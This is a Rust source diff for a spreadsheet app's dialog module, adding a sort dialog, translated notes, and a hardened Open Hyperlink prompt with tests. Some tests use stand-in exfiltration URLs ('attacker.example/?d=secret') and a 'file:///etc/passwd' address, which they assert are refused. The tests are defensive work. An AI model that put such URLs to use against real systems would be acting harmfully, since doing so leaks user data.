@@ -26,6 +26,7 @@ mod names;
 mod paste;
 mod ref_edit;
 mod show;
+mod sort_dialog;
 mod spelling;
 mod zoom;
 
@@ -38,6 +39,7 @@ use names::pasteable_names;
 pub(crate) use ref_edit::SHEET_DELETED;
 pub(crate) use show::build_params;
 pub use show::show;
+pub(crate) use sort_dialog::{grid_sense, refuse_sheet_change};
 use zoom::zoom_preset;
 
 /// A form field. `Ref` is a range reference that can also be picked by selecting on the grid
@@ -64,6 +66,8 @@ pub struct Dialog {
     pub tab: String,
     pub search: String,
     pub list_index: usize,
+    /// Custom Sort's own state: the selection to restore and the column choices.
+    sort: sort_dialog::State,
     pub result: Option<Json>,
     /// "Show password" is ticked: password fields show their text.
     pub show_password: bool,
@@ -74,6 +78,9 @@ pub struct Dialog {
     picture_target: Option<(u64, usize)>,
     /// The dialog this one was opened from (Name Manager › New…): it comes back when this closes.
     back: Option<Box<Dialog>>,
+    /// Open Hyperlink: the address the prompt shows, which OK opens. Private, unlike `values`, so
+    /// `ui.dialog.set` can't swap it behind the text the user reads (#2181).
+    link: Option<String>,
     pub(crate) focus_initialized: bool,
     /// The formula box that takes references clicked or dragged on the grid (New Formatting Rule).
     pick: Option<RefPick>,
@@ -154,17 +161,29 @@ impl Dialog {
         ref_edit::end_pick(app, self)
     }
 
-    /// Whether the dialog's own sheet is protected, once its reference boxes have picked and while
+    /// Whether the dialog's own sheet is protected, for a dialog with reference boxes and while
     /// that sheet exists (the sheet [`Self::end_pick`] shows again); `None` otherwise.
     pub(crate) fn home_sheet_protected(&self, app: &SheetApp) -> Option<bool> {
         ref_edit::home_sheet_protected(app, self)
     }
 
-    /// Whether the sheet the dialog was opened on was deleted while its reference boxes picked:
-    /// OK is then refused with [`SHEET_DELETED`], since references without a sheet name have
-    /// nothing to refer to.
+    /// Whether the sheet a dialog with reference boxes was opened on was deleted while it was
+    /// open: OK is then refused with [`SHEET_DELETED`], since references without a sheet name
+    /// have nothing to refer to.
     pub(crate) fn home_sheet_deleted(&mut self, app: &SheetApp) -> bool {
         ref_edit::home_sheet_deleted(app, self)
+    }
+
+    /// A press on the grid that selects cells: the reference box being picked into takes the
+    /// selection on this frame even when it is unchanged (a click on the cell already selected).
+    pub(crate) fn note_selecting_press(&mut self) {
+        ref_edit::note_selecting_press(self);
+    }
+
+    /// Whether a reference box is the one grid selections fill: a click on the grid is then a
+    /// pick, and a second click on the same cell does not edit the cell.
+    pub(crate) fn ref_box_picks(&self) -> bool {
+        ref_edit::picks(self)
     }
 
     /// Whether a click on the grid goes to a formula box of this dialog rather than the selection.
@@ -218,12 +237,14 @@ impl Dialog {
             tab: String::new(),
             search: String::new(),
             list_index: 0,
+            sort: Default::default(),
             result: None,
             show_password: false,
             focus_first_field: true,
             picture_inbox: None,
             picture_target: None,
             back: None,
+            link: None,
             focus_initialized: false,
             pick: None,
             original_link_text: None,
@@ -242,12 +263,14 @@ impl Dialog {
             tab: String::new(),
             search: String::new(),
             list_index: 0,
+            sort: Default::default(),
             result: None,
             show_password: false,
             focus_first_field: false,
             picture_inbox: None,
             picture_target: None,
             back: None,
+            link: None,
             focus_initialized: false,
             pick: None,
             original_link_text: None,
@@ -261,7 +284,7 @@ impl Dialog {
         let active = app.session.active().map(|d| d.selection.active.a1()).unwrap_or_default();
         let p = |k: &str| params.get(k).cloned().unwrap_or(Json::Null);
         use Field::*;
-        let d = match name {
+        let mut d = match name {
             "insertCells" => Dialog::form(
                 "insertCells",
                 "Insert",
@@ -342,7 +365,7 @@ impl Dialog {
                     vec![
                         Number { key: "to", label: "Before sheet (position, 0 = first):" },
                         Check { key: "copy", label: "Create a copy" },
-                        Note(format!("Sheets: {}", sheets.join(", "))),
+                        Note(app.ui.language.tr_fill("Sheets: {sheets}", &[("sheets", &sheets.join(", "))])),
                     ],
                     json!({"to": 0, "copy": false}),
                 );
@@ -435,6 +458,22 @@ impl Dialog {
                 // An empty password from the start, so OK on the untouched field says "incorrect"
                 // rather than asking for the password again.
                 let mut values = params.clone();
+                // A workbook with a password to modify asks for that, or a read-only open.
+                if p("modify").as_bool().unwrap_or(false) {
+                    values["modifyPassword"] = json!("");
+                    values["readOnly"] = json!(false);
+                    return Some(Dialog::form(
+                        "openPassword",
+                        "Password",
+                        "file.open",
+                        vec![
+                            Note(format!("'{file}' is reserved by its author. Enter the password to modify it, or open it read-only.")),
+                            Password { key: "modifyPassword", label: "Password:" },
+                            Check { key: "readOnly", label: "Read Only" },
+                        ],
+                        values,
+                    ));
+                }
                 values["password"] = json!("");
                 Dialog::form(
                     "openPassword",
@@ -459,7 +498,10 @@ impl Dialog {
                     "unhideSheet",
                     "Unhide",
                     "sheet.unhide",
-                    vec![Text { key: "sheet", label: "Unhide sheet:" }, Note(format!("Hidden: {}", opts.join(", ")))],
+                    vec![
+                        Text { key: "sheet", label: "Unhide sheet:" },
+                        Note(app.ui.language.tr_fill("Hidden: {sheets}", &[("sheets", &opts.join(", "))])),
+                    ],
                     json!({"sheet": first}),
                 );
                 d.values.insert("sheet".into(), json!(first));
@@ -489,7 +531,13 @@ impl Dialog {
                     Choice {
                         key: "operation",
                         label: "Operation",
-                        options: vec![("none", "None"), ("add", "Add"), ("subtract", "Subtract"), ("multiply", "Multiply"), ("divide", "Divide")],
+                        options: vec![
+                            ("none", "None"),
+                            ("add", "Paste Special|Add"),
+                            ("subtract", "Subtract"),
+                            ("multiply", "Multiply"),
+                            ("divide", "Divide"),
+                        ],
                     },
                     Check { key: "skipBlanks", label: "Skip blanks" },
                     Check { key: "transpose", label: "Transpose (E)" },
@@ -529,19 +577,18 @@ impl Dialog {
                     json!({"text": existing}),
                 )
             }
-            // Asks before a web or e-mail link leaves the workbook; OK runs `link.open`, which
-            // refuses anything but http, https and mailto.
+            // Asks before a web or e-mail link leaves the workbook. OK opens it through
+            // `Session::open_confirmed_link` (which refuses anything but http, https and mailto),
+            // not a command: `link.open` refuses web addresses for programmatic callers, and a
+            // dialog without a command can't be confirmed over the control channel (#2181).
             "openLink" => {
                 let url = params.get("url").and_then(Json::as_str).unwrap_or_default().to_string();
-                Dialog::form(
-                    "openLink",
-                    "Open Hyperlink",
-                    "link.open",
-                    vec![Note(format!(
-                        "This workbook asks to open the address below. Links can lead to harmful sites or start other programs: open it only if you trust the workbook.\n\n{url}"
-                    ))],
-                    json!({"url": url}),
-                )
+                let mut d = Dialog::custom("openLink", "Open Hyperlink", json!({"url": url}));
+                d.fields = vec![Note(format!(
+                    "This workbook asks to open the address below. Links can lead to harmful sites or start other programs: open it only if you trust the workbook.\n\n{url}"
+                ))];
+                d.link = Some(url);
+                d
             }
             "insertLink" => {
                 let mut d = Dialog::form(
@@ -632,7 +679,7 @@ impl Dialog {
                 vec![
                     Check { key: "tab", label: "Tab" },
                     Check { key: "semicolon", label: "Semicolon" },
-                    Check { key: "comma", label: "Comma" },
+                    Check { key: "comma", label: "Text to Columns|Comma" },
                     Check { key: "space", label: "Space" },
                     Text { key: "other", label: "Other:" },
                     Check { key: "treatConsecutive", label: "Treat consecutive delimiters as one" },
@@ -970,11 +1017,7 @@ impl Dialog {
                 }],
                 json!({"kind": "blanks"}),
             ),
-            "sort" => {
-                // Seed "Sort by" from the column the user is actually in (#1906).
-                let col = app.session.active().map(|d| gridcraft_engine::core::col_to_letters(d.selection.active.col)).unwrap_or_else(|| "A".into());
-                Dialog::custom("sort", "Sort", json!({"header": true, "levels": [{"column": col, "order": "asc"}]}))
-            }
+            "sort" => sort_dialog::open(app, &params)?,
             "nameManager" => Dialog::custom("nameManager", "Name Manager", json!({})),
             "pasteName" => {
                 // F3 opens it only when the workbook has names to paste, as in Excel.
@@ -990,6 +1033,7 @@ impl Dialog {
                 dialog
             }
             "manageRules" => Dialog::custom("manageRules", "Conditional Formatting Rules Manager", json!({})),
+            "newFormattingRule" => cond_format_rules::new_rule_dialog(app, &params),
             "commandSearch" => Dialog::custom("commandSearch", "Search Commands", json!({})),
             "agents" => Dialog::custom("agents", "Agent Control", json!({})),
             "about" => {
@@ -1091,6 +1135,9 @@ impl Dialog {
                 dialog
             }
             "pickList" => Dialog::custom("pickList", "Pick From List", json!({})),
+            "assignAction" => return crate::control_ui::open_assign(app, &params),
+            "formatControl" => return crate::control_ui::open_format(app, &params),
+            "controlQuestion" => return crate::control_ui::open_question(&params),
             "saveCopy" => Dialog::custom("saveCopy", "Save a Copy", json!({"format": p("format")})),
             "saveChanges" => Dialog::custom("saveChanges", "Save Changes?", json!({"title": p("title"), "quit": p("quit")})),
             "start" => Dialog::custom("start", "GridCraft", json!({})),
@@ -1112,6 +1159,7 @@ impl Dialog {
             }
             _ => return None,
         };
+        ref_edit::record_home(app, &mut d);
         Some(d)
     }
 }
@@ -1119,6 +1167,51 @@ impl Dialog {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// The text of the dialog's note.
+    fn note(d: &Dialog) -> String {
+        d.fields.iter().find_map(|f| if let Field::Note(text) = f { Some(text.clone()) } else { None }).unwrap_or_default()
+    }
+
+    #[test]
+    fn sheet_notes_follow_the_interface_language() {
+        use crate::i18n::Language;
+        let mut session = gridcraft_engine::Session::default();
+        session.new_workbook();
+        let mut app = SheetApp::new(session, Default::default());
+        app.run("home.insertSheet", json!({})).unwrap();
+        let unhide = json!({"sheets": ["Sheet2"]});
+        assert_eq!(note(&Dialog::open(&mut app, "moveSheet", json!({})).unwrap()), "Sheets: Sheet1, Sheet2");
+        assert_eq!(note(&Dialog::open(&mut app, "unhideSheet", unhide.clone()).unwrap()), "Hidden: Sheet2");
+        let it = Language::It;
+        app.ui.language = it;
+        let moved = note(&Dialog::open(&mut app, "moveSheet", json!({})).unwrap());
+        assert_eq!(moved, it.tr("Sheets: {sheets}").replace("{sheets}", "Sheet1, Sheet2"));
+        assert!(!moved.starts_with("Sheets"));
+        let hidden = note(&Dialog::open(&mut app, "unhideSheet", unhide).unwrap());
+        assert_eq!(hidden, it.tr("Hidden: {sheets}").replace("{sheets}", "Sheet2"));
+        assert!(!hidden.starts_with("Hidden"));
+    }
+
+    #[test]
+    fn goal_seek_success_toast_follows_the_interface_language() {
+        use crate::i18n::Language;
+        let mut session = gridcraft_engine::Session::default();
+        session.new_workbook();
+        let mut app = SheetApp::new(session, Default::default());
+        app.run("cell.set", json!({"cell": "B1", "input": "=A1*2"})).unwrap();
+        let it = Language::It;
+        app.ui.language = it;
+        let mut d = Dialog::custom("goalSeek", "Goal Seek", json!({"set": "B1", "to": "10", "changing": "A1"}));
+        let ctx = egui::Context::default();
+        let mut out = ctx.run_ui(egui::RawInput::default(), |ui| analysis::goal_seek(&mut app, ui, &mut d, &mut true, &mut true));
+        out.textures_delta.clear();
+        assert_eq!(app.message, None);
+        // The value is shown as before (the JSON number the command returns).
+        let want = it.tr("Goal Seeking found a solution: {value}").replace("{value}", "5.0");
+        assert_eq!(app.toast.map(|t| t.0), Some(want.clone()));
+        assert!(!want.starts_with("Goal Seeking"));
+    }
 
     #[test]
     fn remove_duplicates_prefills_the_selection_and_submits_the_edited_range() {
@@ -1161,6 +1254,60 @@ mod tests {
         let at = gridcraft_engine::core::CellRef::new(0, 0);
         assert!(gridcraft_engine::cmd::data::check_validation(&doc.wb, 0, at, "6").is_none());
         assert!(gridcraft_engine::cmd::data::check_validation(&doc.wb, 0, at, "4").is_some());
+    }
+
+    /// #2181: a programmatic `link.open` opens nothing; the Open Hyperlink prompt has no command
+    /// the control channel could confirm, and its OK opens exactly the address it showed.
+    #[test]
+    fn open_hyperlink_opens_only_the_address_the_user_confirmed() {
+        use show::open_confirmed_link;
+        use std::{cell::RefCell, rc::Rc};
+        let opened = Rc::new(RefCell::new(Vec::<String>::new()));
+        let sink = opened.clone();
+        let services = crate::Services { open_url: Some(Box::new(move |u: &str| sink.borrow_mut().push(u.to_string()))), ..Default::default() };
+        let mut session = gridcraft_engine::Session::default();
+        session.new_workbook();
+        let mut app = SheetApp::new(session, services);
+        assert!(app.run("link.open", json!({"url": "https://attacker.example/?d=secret"})).is_err());
+        app.after_engine();
+        assert!(opened.borrow().is_empty(), "a programmatic link.open opens nothing");
+        assert!(app.dialog.is_none(), "and opens no dialog");
+
+        let mut d = Dialog::open(&mut app, "openLink", json!({"url": "https://example.org/a"})).unwrap();
+        assert!(d.command.is_none(), "`ui.dialog.confirm` can't press OK for the user");
+        // A value edited behind the prompt's text is ignored: OK opens what the user read.
+        d.set_value("url", json!("https://attacker.example/?d=secret"));
+        open_confirmed_link(&mut app, &d).unwrap();
+        assert_eq!(*opened.borrow(), vec!["https://example.org/a".to_string()]);
+
+        let bad = Dialog::open(&mut app, "openLink", json!({"url": "file:///etc/passwd"})).unwrap();
+        assert!(open_confirmed_link(&mut app, &bad).is_err());
+        assert_eq!(opened.borrow().len(), 1);
+    }
+
+    /// #2181: an OK that arrives with synthetic control-channel input (`ui.key` Enter, `ui.click`
+    /// on OK) opens nothing and keeps the prompt open; the same OK from the user opens the link.
+    #[test]
+    fn synthetic_input_cannot_confirm_open_hyperlink() {
+        use show::{SYNTHETIC_LINK_CONFIRM, confirm_open_link};
+        use std::{cell::RefCell, rc::Rc};
+        let opened = Rc::new(RefCell::new(Vec::<String>::new()));
+        let sink = opened.clone();
+        let services = crate::Services { open_url: Some(Box::new(move |u: &str| sink.borrow_mut().push(u.to_string()))), ..Default::default() };
+        let mut session = gridcraft_engine::Session::default();
+        session.new_workbook();
+        let mut app = SheetApp::new(session, services);
+        let d = Dialog::open(&mut app, "openLink", json!({"url": "https://example.org/a"})).unwrap();
+
+        app.synthetic_pending = true;
+        assert!(!confirm_open_link(&mut app, &d), "the prompt stays open");
+        assert!(opened.borrow().is_empty(), "synthetic input opens nothing");
+        assert_eq!(app.message.as_ref().map(|m| m.1.as_str()), Some(SYNTHETIC_LINK_CONFIRM));
+
+        app.synthetic_pending = false;
+        app.message = None;
+        assert!(confirm_open_link(&mut app, &d), "the user's OK closes the prompt");
+        assert_eq!(*opened.borrow(), vec!["https://example.org/a".to_string()]);
     }
 
     #[test]
